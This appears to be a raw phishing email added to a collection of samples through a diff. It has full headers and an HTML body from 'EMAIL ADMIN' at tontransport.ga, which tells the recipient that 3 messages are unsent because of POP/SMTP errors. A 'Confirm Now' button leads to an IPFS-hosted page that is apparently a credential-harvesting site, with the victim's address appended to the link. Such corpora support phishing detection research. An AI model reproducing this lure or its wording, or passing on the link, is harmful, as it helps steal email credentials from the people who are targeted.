@@ -1,0 +1,142 @@
+From jose@monkey.org Sun Apr 30 15:51:13 2023 +0000
+Return-Path: info@tontransport.ga
+Delivered-To: jose@monkey.org
+X-FDA: 80738496426.18.65D18C5
+Received: from to.tontransport.ga (to.tontransport.ga [5.182.112.125])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 498A9120042
+	for <jose@monkey.org>; Sun, 30 Apr 2023 15:51:10 +0000 (UTC)
+Authentication-Results: imf16.b.hostedemail.com;
+	dkim=pass header.d=tontransport.ga header.s=to header.b=T5ktJf1s;
+	spf=pass (imf16.b.hostedemail.com: domain of info@tontransport.ga designates 5.182.112.125 as permitted sender) smtp.mailfrom=info@tontransport.ga;
+	dmarc=pass (policy=reject) header.from=tontransport.ga
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1682869871;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=tErosvaExmM5ayksjr1bccn60RTk2qvD7/GO3dciZyM=;
+	b=x8is42AYUT/v0pCRHx1tdJRlk6BLR3RIOYtevxGhiZJ+rQwDHvXCEAZ5R2xL6K+VLQJEe0
+	1b1NodhAAZ5eP8mvxcufu7ex6BAcY/CEHJ2MyYRl8e3ifj1Ti9fw95PUu6LjSACFv158bX
+	5+SCVxZFPyuKwIneT4cmkPt85SFNZfw=
+ARC-Authentication-Results: i=1;
+	imf16.b.hostedemail.com;
+	dkim=pass header.d=tontransport.ga header.s=to header.b=T5ktJf1s;
+	spf=pass (imf16.b.hostedemail.com: domain of info@tontransport.ga designates 5.182.112.125 as permitted sender) smtp.mailfrom=info@tontransport.ga;
+	dmarc=pass (policy=reject) header.from=tontransport.ga
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1682869871; a=rsa-sha256;
+	cv=none;
+	b=hHrh1JGq/OM4f1RdunjuJfnUvf6NgFcoocmAoGH6RgRft0e9wQaExKkZ0tRsXatuPfsLM1
+	xuBdt42Hv+JwOKbFuMmzq48w7Flf/XrztoHYzX+Hlu7AOBL3OCQ/k2g8JhWVABApGp2YKM
+	wKVCZhbU+EXl7qxZ3zlx6KTrcmGNx3c=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=to; d=tontransport.ga;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=info@tontransport.ga;
+ bh=tErosvaExmM5ayksjr1bccn60RTk2qvD7/GO3dciZyM=;
+ b=T5ktJf1siYfsTHdj2/WBQC24W66qbUYYsD/6yVecTgHSsFPItGsE9sBnZ8nK9OoSaQeQ3eZkb5+L
+   LT+byk5vPfxpZy3HYJjvJavvZyLgp0XQNZQIOnxJgidISv/lnFWrHpBMO6xE1CW2N+0Yo0Oqc6IG
+   bYHeM3OA3AHGXR4gBSNh8RFEd7Tg64HIpvkmrt/FOaKCJaEH9z3q+lR76cVKrLuRGD+1PXYRHk/w
+   4EY/3difRZE1Rl/ed5z5iJivbyMqbGkadL3slDZMyGYIsQEG58K7icmTWdkSKu31AFf7plvv+8Fd
+   1DqXl5OQYUonDkQS22+YIkLq1i1VPrTeKyzwVg==
+From: EMAIL ADMIN<info@tontransport.ga>
+To: jose@monkey.org
+Subject: Notification: Your jose@monkey.org POP / SMTP settings are incorrect
+Date: 30 Apr 2023 11:18:49 +0000
+Message-ID: <20230430111848.F9742861149E4B28@tontransport.ga>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 498A9120042
+X-Stat-Signature: ridxif95wyr9w66yup8n95qh3qxs9snm
+X-Rspam-User: 
+X-Spam-Status: No, score=1.17
+X-Rspamd-Server: rspam02
+X-HE-Tag: 1682869870-35685
+X-HE-Meta: U2FsdGVkX1/tl2NCKJ2hlPV6lv+38ujV8bdAessWg9eFv/paCJXOAg0uQPeRGJ1sGwNSAaMkDBu5Htya/DSR5s4ftfOdJpnMW8mYgG3iNJmja34PjbWM5aJtz9CnEyPQbemYtwDSGTIyb6Z+7hjAuW+IHWu6y2Q1hDx7aLYJfDRufpAv6YFyRL77Ltmq5bgR0XyBdLA63WTH0XR2K4eAzf9Cljz5yA2DD+2uxtWFTuw=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 76
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Helvetica=
+, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0p=
+x; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickne=
+ss: initial; text-decoration-style: initial;=20
+text-decoration-color: initial"><FONT style=3D"BOX-SIZING: border-box; VERT=
+ICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN:=
+ inherit"><BR><BR>Note:&nbsp;</FONT></FONT><SPAN style=3D"BOX-SIZING: borde=
+r-box; BORDER-TOP: rgb(51,51,51) 0px dotted; BORDER-RIGHT: rgb(51,51,51) 0p=
+x dotted; BORDER-BOTTOM: rgb(51,51,51) 1px dotted; BORDER-LEFT: rgb(51,51,5=
+1) 0px dotted"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inher=
+it">
+<FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit" color=3D#00=
+00ff><U>jose</U></FONT></FONT></SPAN><FONT style=3D"BOX-SIZING: border-box;=
+ VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-A=
+LIGN: inherit">,</FONT></FONT><BR style=3D"BOX-SIZING: border-box"><BR styl=
+e=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box; VERTICA=
+L-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: in=
+herit">
+You have 3 unsent messages on jose@monkey.org&nbsp;</FONT><FONT style=3D"BO=
+X-SIZING: border-box; VERTICAL-ALIGN: inherit">This is due to a system erro=
+r in your old POP / SMTP settings</FONT></FONT></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Helvetica=
+, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0p=
+x; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickne=
+ss: initial; text-decoration-style: initial;=20
+text-decoration-color: initial"><FONT style=3D"BOX-SIZING: border-box; VERT=
+ICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN:=
+ inherit">Please follow the "Confirm Now" button below at<SPAN style=3D"BOX=
+-SIZING: border-box">&nbsp;</SPAN><FONT color=3D#0000ff><U>monkey.org</U></=
+FONT><SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN>Email Solution Cen=
+ter.&nbsp;</FONT><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inh=
+erit">
+&nbsp;Confirm your emaiI account to enable automatic updating of POP / SMTP=
+ emaiI settings.</FONT></FONT><BR style=3D"BOX-SIZING: border-box"><BR styl=
+e=3D"BOX-SIZING: border-box"></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Helvetica=
+, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0p=
+x; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickne=
+ss: initial; text-decoration-style: initial;=20
+text-decoration-color: initial">
+<A style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; WIDTH: 50%; BACKGROUND=
+: rgb(220,60,0) 0% 50%; COLOR: white; PADDING-BOTTOM: 15px; TEXT-ALIGN: cen=
+ter; PADDING-TOP: 12px; PADDING-LEFT: 12px; PADDING-RIGHT: 12px; text-decor=
+ation-line: none" href=3D"https://reverfyboy.infura-ipfs.io/ipfs/QmfXJtHpJ3=
+m2PfH8AgVmj6VWw42yDqXMZXSpByMoEi3gUe#jose@monkey.org" rel=3Dnoreferrer targ=
+et=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://.&amp;source=
+=3Dgmail&amp;ust=3D1682634802738000&amp;usg=3DAOvVaw0tzx5sq1XoOvl1hlzZcAmH"=
+><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><FONT styl=
+e=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">Confirm Now</FONT></F=
+ONT></A></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Helvetica=
+, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0p=
+x; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickne=
+ss: initial; text-decoration-style: initial;=20
+text-decoration-color: initial"><BR style=3D"BOX-SIZING: border-box"><FONT =
+style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BO=
+X-SIZING: border-box; VERTICAL-ALIGN: inherit">Sincerely,</FONT></FONT><BR =
+style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box; VER=
+TICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN=
+: inherit"><FONT color=3D#0000ff>monkey.org</FONT><SPAN style=3D"BOX-SIZING=
+: border-box">&nbsp;</SPAN>support team.</FONT></FONT></P>
+</BODY></HTML>
